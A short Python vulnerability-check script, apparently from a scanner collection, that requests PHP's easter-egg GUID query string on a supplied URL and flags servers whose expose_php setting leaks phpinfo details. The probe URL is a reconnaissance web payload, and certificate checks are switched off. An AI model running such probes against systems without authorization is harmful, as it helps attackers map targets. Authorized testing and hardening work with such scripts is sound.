#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: php expose_php模块开启
referer: http://blog.csdn.net/change518/article/details/39892449
author: Lucifer
description: 开启了expose_php模块。
'''
import sys
import requests
import warnings
from termcolor import cprint

class php_expose_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"XMLWriter" in req.text and r"phpinfo" in req.text:
                cprint("[+]存在php expose_php模块开启...(信息)\tpayload: "+vulnurl, "green")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = php_expose_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()